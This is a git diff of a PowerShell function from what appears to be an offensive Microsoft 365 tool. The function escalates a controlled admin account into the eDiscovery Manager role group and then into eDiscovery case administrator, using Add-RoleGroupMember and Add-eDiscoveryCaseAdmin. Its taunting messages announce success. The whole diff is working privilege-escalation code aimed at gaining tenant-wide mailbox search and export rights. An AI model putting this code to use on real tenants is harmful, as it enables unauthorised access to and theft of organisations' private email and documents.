@@ -227,42 +227,46 @@ function E_Discovery_Downloader ($case_name, $export_name){
 }
 
 function E_Discovery_Priv_Esc {
-    ##Check if account has eDiscovery Manager role
     $role_members = Get-RoleGroupMember "eDiscovery Manager"
-    
-    if ((Get-AzureADUser -ObjectId $global:AdminUsername).DisplayName -in $role_members.Name){
-        Write-Host "`nSometimes life is not that hard ;)"
-        Write-Host "You are already eDiscovery Manager!!!" -ForegroundColor Yellow
-        return
-    }
-    else {
-        ##Escalate privileges to eDiscovery
-        try {
-            ##Create PSsession
-            $Comp_Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.compliance.protection.outlook.com/powershell-liveid -Credential $global:AdminCredential -Authentication Basic -AllowRedirection 
-            Import-PSSession $Comp_Session -AllowClobber
+    $admin_role_members = Get-eDiscoveryCaseAdmin
 
-            Write-Host "`nAttempting to escalate privileges to eDiscovery Manager role ..." -ForegroundColor Gray
-            Add-RoleGroupMember -Identity "eDiscovery Manager" -Member $global:AdminUsername -ErrorAction Stop
-            Write-Host "`nSuccessfully elevated privileges to eDiscovery Manager role!"
-            Write-Host "Waiting for changes to take effect..."
+    #Check eDiscovery Admin 
+    if ((Get-AzureADUser -ObjectId $global:AdminUsername).DisplayName -notin $admin_role_members.Name){
+
+        ###Not eDiscovery Manager
+        if ((Get-AzureADUser -ObjectId $global:AdminUsername).DisplayName -notin $role_members.Name){ 
+            #Escalate to Manager
+            try {
+                Write-Host "`nAttempting to escalate privileges to eDiscovery Manager role ..." -ForegroundColor Gray
+                Add-RoleGroupMember -Identity "eDiscovery Manager" -Member $global:AdminUsername -ErrorAction Stop
+                Write-Host "`nSuccessfully elevated privileges to eDiscovery Manager role!"
+                Write-Host "Waiting for changes to take effect..." -ForegroundColor Gray
+                Start-Sleep -Seconds 30
+            }
+            catch {
+                Write-Host "Error: Failed to elevate privileges to eDiscovery Manager"
+                break
+            }
+        }
+        
+        ###Escalate to eDiscovery Admin
+        try {
+            Write-Host "`nNow attempting to escalate privileges to eDiscovery Administrator..." -ForegroundColor Gray
+            Add-eDiscoveryCaseAdmin -User $global:AdminUsername
+            Write-Host "Waiting for changes to take effect..." -ForegroundColor Gray
             Start-Sleep -Seconds 30
+            Write-Host "`nYou are now eDiscovery Admin!!!" -ForegroundColor Yellow
         }
         catch {
-            Write-Host "Error: Failed to elevate privileges to eDiscovery Manager"
+            Write-Host "Failed to escalate privileges to eDiscovery Admin!" -ForegroundColor Red
             break
         }
-    }
 
-    ##Create new PSSession
-    Write-Host "Re-establishing session with compliance service using elevated privileges..."
-    try {
-        $Comp_Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.compliance.protection.outlook.com/powershell-liveid -Credential $global:AdminCredential -Authentication Basic -AllowRedirection
-        Start-Sleep -Seconds 5
-        Import-PSSession $Comp_Session -AllowClobber -DisableNameChecking
     }
-    catch {
-        Write-Host "Error: Failed to establish new session!" -ForegroundColor Red
+    else {
+        Write-Host "`nSometimes life is not that hard ;)"
+        Write-Host "You are already eDiscovery Admin & Manager!!!" -ForegroundColor Yellow
+        return
     }
 }
 
